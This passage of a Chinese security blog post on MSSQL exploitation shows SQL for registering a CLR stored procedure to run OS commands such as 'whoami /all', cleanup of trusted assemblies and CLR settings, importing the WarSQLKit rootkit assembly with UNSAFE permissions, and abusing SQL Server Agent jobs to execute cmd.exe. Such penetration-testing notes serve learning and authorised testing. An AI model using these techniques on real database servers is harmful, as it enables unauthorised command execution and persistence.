+<span class="token keyword">AS</span> EXTERNAL NAME <span class="token punctuation">[</span>CLR<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>StoredProcedures<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>ExecCommand<span class="token punctuation">]</span>
+go</code></pre>
+
+<h2 id="利用-CLR-执行系统命令"><a href="#利用-CLR-执行系统命令" class="headerlink" title="利用 CLR 执行系统命令"></a>利用 CLR 执行系统命令</h2><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> dbo<span class="token punctuation">.</span>ExecCommand <span class="token string">"whoami /all"</span></code></pre>
+
+<h2 id="删除存储过程、程序集以及受信任的哈希值"><a href="#删除存储过程、程序集以及受信任的哈希值" class="headerlink" title="删除存储过程、程序集以及受信任的哈希值"></a>删除存储过程、程序集以及受信任的哈希值</h2><h3 id="SQL-Server-2017-之前的版本"><a href="#SQL-Server-2017-之前的版本" class="headerlink" title="SQL Server 2017 之前的版本"></a>SQL Server 2017 之前的版本</h3><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">DATABASE</span> <span class="token operator">&lt;</span>CONNECTED <span class="token keyword">DATABASE</span><span class="token operator">></span> <span class="token keyword">SET</span> TRUSTWORTHY <span class="token keyword">OFF</span></code></pre>
+
+<h3 id="SQL-Server-2017-及更高版本"><a href="#SQL-Server-2017-及更高版本" class="headerlink" title="SQL Server 2017 及更高版本"></a>SQL Server 2017 及更高版本</h3><pre class="language-sql" data-language="sql"><code class="language-sql">sp_drop_trusted_assembly <span class="token variable">@hash</span><span class="token operator">=</span><span class="token operator">&lt;</span>SHA512 <span class="token keyword">of</span> DLL<span class="token operator">></span></code></pre>
+
+<h3 id="通用"><a href="#通用" class="headerlink" title="通用"></a>通用</h3><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">PROCEDURE</span> debugrun<span class="token punctuation">;</span>
+<span class="token keyword">DROP</span> ASSEMBLY clrassem<span class="token punctuation">;</span>
+sp_configure <span class="token string">'clr strict security'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span>
+sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span></code></pre>
+
+<h2 id="WarSQLKit"><a href="#WarSQLKit" class="headerlink" title="WarSQLKit"></a>WarSQLKit</h2><p>WarSQLKit 是一个针对 MSSQL CLR 进行利用的工具，有以下两个版本</p>
+<p>WarSQLKit 是一个针对 MSSQL CLR 进行利用的工具，有以下两个版本</p>
+<ul>
+<li>WarSQLKit 是完全版本，内置多种功能。</li>
+<li>WarSQLKitMinimal 是简化版，只能执行命令。</li>
+</ul>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit">https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit</a></p>
+<p>导入方式和前面差不多</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 导入</span>
+<span class="token keyword">CREATE</span> ASSEMBLY <span class="token punctuation">[</span>WarSQLKit<span class="token punctuation">]</span>
+    <span class="token keyword">AUTHORIZATION</span> <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span>
+    <span class="token keyword">FROM</span> <span class="token number">0x4D5A</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token keyword">WITH</span> PERMISSION_SET <span class="token operator">=</span> UNSAFE<span class="token punctuation">;</span>
+GO
+
+<span class="token comment"># 创建</span>
+<span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> sp_cmdExec
+<span class="token variable">@Command</span> <span class="token punctuation">[</span>nvarchar<span class="token punctuation">]</span><span class="token punctuation">(</span>max<span class="token punctuation">)</span>
+<span class="token keyword">WITH</span> <span class="token keyword">EXECUTE</span> <span class="token keyword">AS</span> CALLER
+<span class="token keyword">AS</span>
+EXTERNAL NAME WarSQLKit<span class="token punctuation">.</span>StoredProcedures<span class="token punctuation">.</span>CmdExec
+GO</code></pre>
+
+<p>用法见 README</p>
+<h1 id="SQL-Server-Agent-Job-代理执行计划任务利用"><a href="#SQL-Server-Agent-Job-代理执行计划任务利用" class="headerlink" title="SQL Server Agent Job 代理执行计划任务利用"></a>SQL Server Agent Job 代理执行计划任务利用</h1><p>SQL Server 代理是一项 Microsoft Windows 服务，它执行计划的管理任务，这些任务在 SQL Server 中称为作业</p>
+<p>在 Sql Server 配置管理器，启用 SQL Server 代理，注意 Express 版本 Sql Server 是无法启用的</p>
+<p>创建计划任务</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">USE</span> msdb<span class="token punctuation">;</span> 
+<span class="token keyword">EXEC</span> dbo<span class="token punctuation">.</span>sp_add_job <span class="token variable">@job_name</span> <span class="token operator">=</span> N<span class="token string">'test_powershell_job1'</span><span class="token punctuation">;</span> 
+<span class="token keyword">EXEC</span> sp_add_jobstep <span class="token variable">@job_name</span> <span class="token operator">=</span> N<span class="token string">'test_powershell_job1'</span><span class="token punctuation">,</span> <span class="token variable">@step_name</span> <span class="token operator">=</span> N<span class="token string">'test_powershell_name1'</span><span class="token punctuation">,</span> <span class="token variable">@subsystem</span> <span class="token operator">=</span> N<span class="token string">'PowerShell'</span><span class="token punctuation">,</span> <span class="token variable">@command</span> <span class="token operator">=</span> N<span class="token string">'c:\windows\system32\cmd.exe /c whoami >c:\\1.txt'</span><span class="token punctuation">,</span> <span class="token variable">@retry_attempts</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">@retry_interval</span> <span class="token operator">=</span> <span class="token number">5</span> <span class="token punctuation">;</span><span class="token keyword">EXEC</span> dbo<span class="token punctuation">.</span>sp_add_jobserver <span class="token variable">@job_name</span> <span class="token operator">=</span> N<span class="token string">'test_powershell_job1'</span><span class="token punctuation">;</span> 
+<span class="token keyword">EXEC</span> dbo<span class="token punctuation">.</span>sp_start_job N<span class="token string">'test_powershell_job1'</span><span class="token punctuation">;</span></code></pre>
+
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9475">https://xz.aliyun.com/t/9475</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Zh0um1</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://Zh0um1.github.io/posts/5beaca16.html">http://Zh0um1.github.io/posts/5beaca16.html</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Zh0um1</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/MSSQL/">
+                                    <span class="chip bg-color">MSSQL</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/posts/5beaca16.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="MSSQL 一般利用方式">
+                        
+                        <span class="card-title">MSSQL 一般利用方式</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-20
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Zh0um1
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/MSSQL/">
+                        <span class="chip bg-color">MSSQL</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/posts/1385ebc.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="Adfind 常用命令">
+                        
+                        <span class="card-title">Adfind 常用命令</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-14
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Zh0um1
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Tools/">
+                        <span class="chip bg-color">Tools</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1,h2, h3'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1,h2, h3').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2022</span>
+            
+            <a href="/about" target="_blank">Zh0um1</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/Zh0um1" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
